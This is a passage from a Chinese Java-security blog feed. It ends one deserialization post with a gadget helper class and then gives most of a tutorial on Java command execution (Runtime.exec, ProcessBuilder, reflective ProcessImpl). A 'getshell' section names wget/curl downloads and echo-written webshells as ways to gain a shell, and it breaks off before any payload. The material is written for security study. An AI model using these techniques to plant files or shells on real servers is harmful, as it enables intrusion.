<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x901A;&#x8FC7;&#x91CD;&#x5199; <code>getHostAddress</code> &#x7684;&#x65B9;&#x5F0F;&#x53BB;&#x907F;&#x514D;&#x5728;&#x751F;&#x6210; POC &#x7684;&#x65F6;&#x5019;&#x53D1;&#x51FA; DNS &#x8BF7;&#x6C42;</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201762</a></p>
<p><a href="https://payloads.info" target="_blank" rel="noopener">https://payloads.info</a></p>
<p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a></p>
</body></html>]]></content>
      <categories>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析 Java 命令执行</title>
    <url>/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<html><head></head><body><p>&#x5BF9; Java &#x547D;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6D41;&#x7A0B;&#x4EE5;&#x53CA;&#x5229;&#x7528;&#x5751;&#x70B9;&#x8FDB;&#x884C;&#x5B66;&#x4E60;&#x5206;&#x6790;</p>
<a id="more"></a>

<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>Java &#x7684;&#x5927;&#x591A;&#x6570;&#x653B;&#x51FB;&#x7684;&#x6700;&#x540E;&#x8C03;&#x7528;&#x90FD;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#xFF0C;&#x800C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6D89;&#x53CA;&#x7684;&#x65B9;&#x65B9;&#x9762;&#x9762;&#x8FD8;&#x662F;&#x5927;&#x6709;&#x53EF;&#x6DF1;&#x7A76;</p>
<p>&#x672C;&#x6587;&#x4ECE;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x7EF4;&#x5EA6;&#x5206;&#x6790; Java &#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<ul>
<li>How to Command execution</li>
<li>How to getshell</li>
</ul>
<h1 id="How-to-Command-execution"><a href="#How-to-Command-execution" class="headerlink" title="How to Command execution"></a>How to Command execution</h1><p>&#x9996;&#x5148;&#x8C08;&#x4E00;&#x4E0B; Java &#x5F53;&#x4E2D;&#x7A76;&#x7ADF;&#x6709;&#x54EA;&#x4E9B;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<ul>
<li>java.lang.Runtime#exec()</li>
<li>java.lang.ProcessBuilder#start()</li>
<li>java.lang.ProcessImpl#start()</li>
<li>&#x66F4;&#x591A;&#xFF08;&#x5982; <strong>JNI &#x8C03;&#x7528;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;</strong>&#x3001;<strong>Unsafe</strong> &#x7C7B;&#x3001;<strong>defineClass()</strong> &#x7B49;&#xFF0C;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x63A2;&#x8BA8;&#x8303;&#x56F4;&#xFF09;</li>
</ul>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/640-20210104175324690.png" alt="&#x56FE;&#x7247;"></p>
<h2 id="java-lang-Runtime-exec"><a href="#java-lang-Runtime-exec" class="headerlink" title="java.lang.Runtime#exec()"></a>java.lang.Runtime#exec()</h2><p>&#x5148;&#x770B;&#x4E00;&#x4E0B;&#x6E90;&#x7801;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210205161800399.png" alt="image-20210205161800399"></p>
<p>&#x9996;&#x5148; java.lang.Runtime &#x662F;&#x4E00;&#x4E2A;&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#xFF0C;&#x5B83;&#x4E0D;&#x80FD;&#x88AB;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7; <code>getRuntime</code> &#x83B7;&#x5F97;&#x5BF9;&#x8C61;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x53C2;&#x8003;: <a href="https://www.runoob.com/design-pattern/singleton-pattern.html" target="_blank" rel="noopener">&#x5355;&#x4F8B;&#x6A21;&#x5F0F;</a></p>
<p>&#x770B;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x4F8B;&#x5B50;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecDemo00</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        Process  procdemo = Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6210;&#x529F;&#x5F39;&#x51FA;&#x4E86;&#x8BA1;&#x7B97;&#x5668;&#xFF0C;&#x90A3;&#x4E48;&#x5176;&#x5B9E;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x66F4;&#x591A;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E0A;&#xFF0C;&#x5149;&#x5F39;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x5668;&#x662F;&#x4E0D;&#x591F;&#x7684;</p>
<p><strong>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5728;&#x5F88;&#x591A;&#x573A;&#x666F;&#x4E0B;&#x9700;&#x8981;&#x5176;&#x56DE;&#x663E;&#x529F;&#x80FD;</strong></p>
<p>&#x7531;&#x6B64;&#x4E00;&#x822C;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1B;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecDemo01</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">         * &#x83B7;&#x53D6; Process &#x7C7B;</span></span><br><span class="line"><span class="hljs-comment">         */</span></span><br><span class="line">        Process procexec = Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);</span><br><span class="line">        <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">         * &#x83B7;&#x53D6;&#x8F93;&#x5165;&#x6D41;&#x3001;&#x5B50;&#x8FDB;&#x7A0B;&#x6807;&#x51C6;&#x8F93;&#x51FA;</span></span><br><span class="line"><span class="hljs-comment">         */</span></span><br><span class="line">        InputStream ins = procexec.getInputStream();</span><br><span class="line">        <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">         * &#x521B;&#x5EFA; ByteArrayOutputStream &#x7F13;&#x51B2;&#x533A;</span></span><br><span class="line"><span class="hljs-comment">         */</span></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];</span><br><span class="line">        <span class="hljs-keyword">int</span> size;</span><br><span class="line">        <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">         * ins.read(bytes) &#x4ECE;&#x8F93;&#x5165;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x4E00;&#x5B9A;&#x6570;&#x91CF;&#x7684;&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x5230;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x7EC4;&#x4E2D; bytes</span></span><br><span class="line"><span class="hljs-comment">         * &#x8FD4;&#x56DE;&#x503C;&#xFF1A;&#x8BFB;&#x5165;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x603B;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x6216;&#x8005; -1 &#x7531;&#x4E8E;&#x5230;&#x8FBE;&#x6D41;&#x7684;&#x672B;&#x5C3E;&#x800C;&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x6570;&#x636E;&#x3002;</span></span><br><span class="line"><span class="hljs-comment">         */</span></span><br><span class="line">        <span class="hljs-keyword">while</span> ((size = ins.read(bytes)) &gt; <span class="hljs-number">0</span> ){</span><br><span class="line">            <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">             * &#x5C06; size &#x6307;&#x5B9A;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x4E2D;&#x4ECE;&#x504F;&#x79FB;&#x91CF;&#x5F00;&#x59CB;&#x7684;&#x5B57;&#x8282;&#x5199;&#x5165;&#x6B64;&#x6570;&#x7EC4;&#x8F93;&#x51FA;&#x6D41;</span></span><br><span class="line"><span class="hljs-comment">             */</span></span><br><span class="line">            bos.write(bytes, <span class="hljs-number">0</span>, size);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">         * &#x901A;&#x8FC7;&#x89E3;&#x7801;&#x5B57;&#x8282;&#x5C06;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x3002;</span></span><br><span class="line"><span class="hljs-comment">         */</span></span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x90A3;&#x4E48;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x80FD;&#x591F;&#x83B7;&#x53D6;&#x56DE;&#x663E;&#x5462;&#xFF1F;</p>
<p>&#x5148;&#x56DE;&#x987E;&#x4E00;&#x4E0B; <code>Runtime.exec()</code> &#x7684;&#x4F5C;&#x7528;&#x3002;&#x5176;&#x5B9E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x53EA;&#x662F;&#x6211;&#x4EEC;&#x5BF9;&#x7ED3;&#x679C;&#x7684;&#x4E00;&#x4E2A;&#x7EDF;&#x79F0;&#x3002;&#x90A3;&#x4E48;&#x5B83;&#x5176;&#x5B9E;&#x771F;&#x6B63;&#x7684;&#x4F5C;&#x7528;&#x662F;&#xFF1A;</p>
<p><strong>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;Process&#x5B50;&#x7C7B;&#x7684;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF0C;&#x8BE5;&#x5B9E;&#x4F8B;&#x53EF;&#x7528;&#x6765;&#x63A7;&#x5236;&#x8FDB;&#x7A0B;&#x5E76;&#x83B7;&#x53D6;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x3002;</strong></p>
<p>&#x5BF9;&#x6BD4;&#x4E00;&#x4E0B;&#x4E4B;&#x524D;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x5176;&#x5B9E;&#x5173;&#x952E;&#x51FA;&#x73B0;&#x5728; <code>getInputStream</code> &#x8FD9;&#x91CC;</p>
<p>&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x5176;&#x5B9E; <code>getInputStream</code>&#x662F; Process &#x7C7B;&#x7684;API</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210104230049823.png" alt="image-20210104230049823"></p>
<p>&#x4E4B;&#x540E;&#x521B;&#x5EFA; <code>ByteArrayOutputStream</code> &#x7136;&#x540E;&#x8F6C;&#x6362;&#x51FA;&#x6765;&#x5373;&#x53EF;</p>
<p>&#x7F51;&#x4E0A;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x8BF4;&#x8FD9;&#x91CC;&#x7684;<code>getInputStream</code> &#x7684;&#x4F5C;&#x7528;&#x5C31;&#x53EA;&#x8BF4;&#x4E86;&#x4E00;&#x4E2A;&#x83B7;&#x53D6;&#x8F93;&#x5165;&#x6D41;&#xFF0C;&#x4E4B;&#x524D;&#x5F88;&#x56F0;&#x60D1;&#x4E3A;&#x4EC0;&#x4E48;&#x83B7;&#x53D6;&#x8F93;&#x5165;&#x6D41;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x592A;&#x7406;&#x89E3;&#x8F93;&#x5165;&#x6D41;&#x8DDF;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F93;&#x51FA;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x540E;&#x6765;&#x770B;&#x4E86;&#x4E0B;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF0C;&#x53D1;&#x73B0;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5199;&#x7684;&#x5F88;&#x6E05;&#x695A;<img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210104221719003.png" alt>&#x5927;&#x6982;&#x8FD9;&#x91CC;&#x7684;&#x8F93;&#x5165;&#x6D41;&#x4E0D;&#x662F;&#x5B57;&#x9762;&#x610F;&#x601D;&#x4E0A;&#x7684;&#x7406;&#x89E3;&#x7684;&#x90A3;&#x79CD;&#xFF0C;&#x53CD;&#x6B63;&#x4F1A;&#x83B7;&#x53D6;&#x5B50;&#x6D41;&#x7A0B;&#x6B63;&#x5E38;&#x8F93;&#x51FA;&#x5185;&#x5BB9;&#x5C31;&#x5BF9;&#x4E86;</p>
<p>&#x770B;&#x4E00;&#x4E0B;&#x5B98;&#x65B9;&#x7684;&#x5B9A;&#x4E49;</p>
<blockquote>
<p> <strong>getInputStream</strong></p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">public abstract InputStream getInputStream()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> Returns the input stream connected to the normal output of the subprocess. The stream obtains data piped from the standard output of the process represented by this <code>Process</code> object.</p>
<p> If the standard output of the subprocess has been redirected using <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html#redirectOutput-java.lang.ProcessBuilder.Redirect-" target="_blank" rel="noopener"><code>ProcessBuilder.redirectOutput</code></a> then this method will return a <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html#redirect-output" target="_blank" rel="noopener">null input stream</a>.</p>
<p> Otherwise, if the standard error of the subprocess has been redirected using <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html#redirectErrorStream-boolean-" target="_blank" rel="noopener"><code>ProcessBuilder.redirectErrorStream</code></a> then the input stream returned by this method will receive the merged standard output and the standard error of the subprocess.</p>
<p> Implementation note: It is a good idea for the returned input stream to be buffered.</p>
<ul>
<li><p><strong>Returns:</strong></p>
<p>the input stream connected to the normal output of the subprocess</p>
</li>
</ul>
</blockquote>
<p>&#x90A3;&#x4E48;&#x8054;&#x60F3;&#x5230; Weblogic 2725 &#x7684;&#x83B7;&#x53D6;&#x56DE;&#x663E;&#x7684;&#x601D;&#x8DEF;&#x4E5F;&#x662F;&#x5728; Weblogic&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x5F53;&#x524D;&#x7EBF;&#x7A0B;&#x7C7B;&#xFF0C;&#x7136;&#x540E;&#x5B9A;&#x4F4D;&#x5230;&#x8F93;&#x51FA;&#x7C7B;&#xFF0C;&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;&#x56DE;&#x663E;&#x4FE1;&#x606F;&#x3002;</p>
<h2 id="java-lang-ProcessBuilder-start"><a href="#java-lang-ProcessBuilder-start" class="headerlink" title="java.lang.ProcessBuilder#start()"></a>java.lang.ProcessBuilder#start()</h2><blockquote>
<p>ProcessBuilder&#x662F;&#x4E00;&#x4E2A;final&#x7C7B;&#xFF0C;Process&#x662F;&#x4E00;&#x4E2A;&#x62BD;&#x8C61;&#x7C7B;&#x3002;<code>ProcessBuilder.start()</code> &#x548C; <code>Runtime.exec()</code> &#x65B9;&#x6CD5;&#x90FD;&#x88AB;&#x7528;&#x6765;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FDB;&#x7A0B;&#xFF08;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x884C;&#x64CD;&#x4F5C;&#xFF09;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE; <code>Process</code> &#x5B50;&#x7C7B;&#x7684;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF0C;&#x8BE5;&#x5B9E;&#x4F8B;&#x53EF;&#x7528;&#x6765;&#x63A7;&#x5236;&#x8FDB;&#x7A0B;&#x72B6;&#x6001;&#x5E76;&#x83B7;&#x5F97;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x3002;</p>
</blockquote>
<p><code>ProcessBuilder.start()</code> &#x53EA;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#x53C2;&#x6570;&#xFF0C;&#x4E14; &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x53EF;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x53C2;&#x6570;&#x4F7F;&#x7528;<code>{&quot;cmd&quot;, &quot;/c&quot;}</code> &#x6216; <code>{&quot;/bin/bash&quot;, &quot;-c&quot;}</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecDemo02</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        String[] cmds = {<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>};</span><br><span class="line">        Process procexec = <span class="hljs-keyword">new</span> ProcessBuilder(cmds).start();</span><br><span class="line">        InputStream ins = procexec.getInputStream();</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];</span><br><span class="line">        <span class="hljs-keyword">int</span> size;</span><br><span class="line">        <span class="hljs-keyword">while</span> ((size = ins.read(bytes)) &gt; <span class="hljs-number">0</span> ){</span><br><span class="line">            bos.write(bytes, <span class="hljs-number">0</span>, size);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="java-lang-ProcessImpl"><a href="#java-lang-ProcessImpl" class="headerlink" title="java.lang.ProcessImpl"></a>java.lang.ProcessImpl</h2><p>&#x901A;&#x8FC7;&#x4E4B;&#x524D;&#x7684;&#x56FE;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x77E5;&#x9053; <code>java.lang.ProcessImpl</code> &#x662F;&#x66F4;&#x4E3A;&#x5E95;&#x5C42;&#x7684;&#x5B9E;&#x73B0;&#x3002;</p>
<p>&#x7279;&#x70B9;&#x662F;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x53BB;&#x95F4;&#x63A5;&#x8C03;&#x7528;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecDemo03</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException </span>{</span><br><span class="line">        String[] cmds = {<span class="hljs-string">&quot;whoami&quot;</span>};</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Process procexec = (Process) method.invoke(<span class="hljs-keyword">null</span>,cmds, <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);</span><br><span class="line">        InputStream ins = procexec.getInputStream();</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];</span><br><span class="line">        <span class="hljs-keyword">int</span> size;</span><br><span class="line">        <span class="hljs-keyword">while</span> ((size = ins.read(bytes)) &gt; <span class="hljs-number">0</span> ){</span><br><span class="line">            bos.write(bytes, <span class="hljs-number">0</span>, size);</span><br><span class="line">        }</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="How-to-getshell-by-java-lang-Runtime-exec"><a href="#How-to-getshell-by-java-lang-Runtime-exec" class="headerlink" title="How to getshell by java.lang.Runtime#exec()"></a>How to getshell by java.lang.Runtime#exec()</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><code>java.lang.Runtime#exec()</code> &#x4F5C;&#x4E3A; Java &#x91CC;&#x6700;&#x5E38;&#x89C1;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x6211;&#x4EEC;&#x4E0B;&#x6587;&#x63A2;&#x7A76;&#x5982;&#x4F55;&#x901A;&#x8FC7;&#x5176;&#x8FDB;&#x884C; getshell</p>
<ul>
<li>wget &#x6216;&#x8005; curl &#x4E0B;&#x8F7D;&#x6587;&#x4EF6;</li>
<li>echo &#x5199;&#x5165;webshell<ul>
<li>String[] cmdarray</li>
<li>String command + base64encode</li>
</ul>
</li>
</ul>
<h2 id="wget-and-curl"><a href="#wget-and-curl" class="headerlink" title="wget and curl"></a>wget and curl</h2><ul>
<li>&#x4F18;&#x52BF;<ul>
<li>&#x64CD;&#x4F5C;&#x4FBF;&#x6377; </li>
<li>&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;</li>
</ul>
</li>
<li>&#x7F3A;&#x9677;<ul>
<li>&#x53D7;&#x9650;&#x4E8E;&#x7F51;&#x7EDC;&#x73AF;&#x5883;</li>
</ul>
</li>
</ul>
<p>wget</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;wget https://p2hm1n.com/images/logo.png&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>curl</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;curl -O https://p2hm1n.com/images/logo.png&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="String-cmdarray"><a href="#String-cmdarray" class="headerlink" title="String[] cmdarray"></a>String[] cmdarray</h2><ul>
<li>&#x4F18;&#x52BF;<ul>
<li>&#x76F8;&#x6BD4;&#x4E8E; wget / curl &#x4E0D;&#x53D7;&#x9650;&#x4E8E;&#x7F51;&#x7EDC;&#x73AF;&#x5883;</li>
</ul>
</li>
<li>&#x7F3A;&#x9677;<ul>
<li>&#x517C;&#x5BB9;&#x6027;&#x8F83;&#x5DEE;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x7684;&#x7CFB;&#x7EDF;&#x56FA;&#x5B9A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x65B9;&#x5F0F;</li>
</ul>
</li>
</ul>
<p>&#x524D;&#x63D0;&#xFF1A;getshell&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x9700;&#x8981;&#x5199;&#x5165; webshell&#xFF0C;&#x800C;&#x5199;&#x5165; Webshell &#x7684;&#x547D;&#x4EE4;&#x5F62;&#x5982;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;flag&quot;</span> &gt; flag.txt</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4F46;&#x662F;&#x5229;&#x7528; <code>java.lang.Runtime#exec(String command)</code> &#x76F4;&#x63A5;&#x6267;&#x884C;&#x65E0;&#x6CD5;&#x5199;&#x5165;&#x6587;&#x4EF6; </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;echo \&quot;flag\&quot; &gt; flag.txt&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
